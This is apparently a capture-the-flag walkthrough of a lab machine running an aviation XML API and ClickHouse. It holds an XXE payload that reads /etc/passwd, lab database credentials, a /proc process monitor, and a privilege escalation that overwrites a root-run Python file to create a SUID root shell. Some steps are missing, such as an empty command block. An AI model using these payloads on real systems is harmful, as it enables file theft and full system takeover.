# Exploring the API and ClickHouse

The `db.htb-airport.htb` hostname appears to expose a ClickHouse instance.

**ClickHouse** is an open-source, column-oriented database management system designed for high-performance analytical queries (OLAP). It is commonly used to process and analyze large volumes of data.

![ClickHouse]({{ site.baseurl }}/images/stream/4.png)

![ClickHouse interface]({{ site.baseurl }}/images/stream/4-1.png)

On the API side, the application expects requests with the `application/xml` content type.

![API request]({{ site.baseurl }}/images/stream/4-2.png)

I started by sending a basic XML request. The response indicated that the application expected several AIDX elements:

```text

FlightLeg
LegIdentifier
```

![Initial XML request]({{ site.baseurl }}/images/stream/4-3.png)

![AIDX response]({{ site.baseurl }}/images/stream/4-4.png)

A quick search revealed that **AIDX** stands for *Aviation Information Data Exchange*. It is an XML-based messaging standard used by the aviation industry to exchange operational flight information between airlines and airport systems.

Whenever I encounter an application that processes XML, I check whether it is vulnerable to **XML External Entity (XXE)** attacks.

At this point, however, I did not yet have a reliable way to confirm whether entity expansion was taking place. The API response did not expose the processed XML data, so I decided to investigate the other services first.

An exposed Actuator endpoint is worth investigating. In Java applications, Spring Boot Actuator can expose operational information and management endpoints. Some configurations may also expose sensitive information.

One particularly interesting endpoint is `/actuator/heapdump`.

A heap dump is a snapshot of the JVM heap memory. It can contain objects and data currently held in memory, potentially including credentials, database connection details, tokens, and other sensitive configuration values.

# Testing for XXE

I started by testing an internal XML entity. This helps establish whether the XML parser processes entity declarations and expands references.

After confirming internal entity expansion, I moved on to an external entity referencing a local file.

The following is the structure of the external entity test:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<IATA_AIDX_FlightLegNotifRQ
    Version="22.1"
    TimeStamp="2026-11-21T14:30:00Z"
    TransactionIdentifier="xxe-test-001"
    TransactionStatusCode="Update">

  <Originator CompanyShortName="TEST"
              TravelSector="A"
              Code="TEST"
              CodeContext="3"/>

  <FlightLeg>
    <LegIdentifier>
      <Airline CodeContext="3">ZZ</Airline>
      <FlightNumber>123</FlightNumber>
      <DepartureAirport CodeContext="3">LHR</DepartureAirport>
      <ArrivalAirport CodeContext="3">JFK</ArrivalAirport>
      <OriginDate>2026-11-21</OriginDate>
      <RepeatNumber CurrentInd="true">1</RepeatNumber>
    </LegIdentifier>

    <LegData>
      <RemarkFreeText>&xxe;</RemarkFreeText>
    </LegData>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

![XXE test request]({{ site.baseurl }}/images/stream/14.png)

The important part is not simply whether the API accepts the request. An accepted response only confirms that the message was received. We need to inspect the parsed record in ClickHouse and check whether the referenced file contents appear in the output.

For example, query the record using its transaction identifier:

```bash
curl -sS --user 'svc_events:Yl4aCgh4y2PnU' -G \
  'http://db.htb-airport.htb/' \
  --data-urlencode "query=SELECT transaction_id,event FROM partner_feed.flightleg_json WHERE transaction_id='xxe-test-001'"
```

![Parsed XXE result]({{ site.baseurl }}/images/stream/15.png)

The parsed output is where we can verify whether the external entity was resolved. If the contents of `/etc/passwd` appear in the stored result, that confirms XXE-based local file disclosure.

This is different from merely confirming internal entity expansion: an internal entity can be expanded without the parser being allowed to access external resources.

I first tried to monitor the process using **pspy**, but after some investigation, I discovered that it was too slow to reliably capture the short-lived `clickhouse-client` process.

thats why i did it using py , the following script will capter the request and store them in :
/tmp/mon.log 
```bash
import os
import time

LOG = "/tmp/mon.log"
end = time.time() + 1200
seen = set()

while time.time() < end:
    for pid in os.listdir("/proc"):
        if not pid.isdigit() or pid in seen:
            continue

        try:
            with open("/proc/%s/cmdline" % pid, "rb") as fh:
                cmd = fh.read().replace(
                    b"\x00", b" "
                ).decode("utf-8", "replace").strip()
        except OSError:
            continue

        if "clickhouse-client" in cmd:
            seen.add(pid)

            try:
                uid = os.stat("/proc/%s" % pid).st_uid
            except OSError:
                uid = -1

            with open(LOG, "a") as out:
                out.write(
                    "%s PID=%s UID=%s: %s\n" % (
                        time.strftime("%H:%M:%S", time.gmtime()),
                        pid,
                        uid,
                        cmd
                    )
                )

    time.sleep(0.001)

```

The script performs the following operations:

1. Enumerates running processes through `/proc`.
2. Reads each process's command-line arguments.
3. Looks for processes containing `clickhouse-client`.
4. Records the PID, process owner UID, and command line.
5. Avoids recording the same PID more than once.

We give it a 20-minute monitoring window.

Start it in the background:

```bash

```

- The formatter is stored inside ClickHouse's user files directory.
- The root drainer executes that formatter using Python.
- Therefore, replacing the formatter changes code that will subsequently be executed by the root service.
.


what we are to do ?

- copy /bin/bash and gives it root SUID

```python
import os
os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")
```

We can write this Python code through ClickHouse:

```bash
clickhouse-client --user default --password 'N3v3rs33nD4T4' <<'SQL'
INSERT INTO FUNCTION file('aidx_quarantine.py')
SETTINGS engine_file_truncate_on_insert=1
SELECT 'import os;os.system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash")'
SQL
```


To verify the file contents:

```bash
clickhouse-client --user default --password 'N3v3rs33nD4T4' \
    -q "SELECT * FROM file('aidx_quarantine.py')"
```
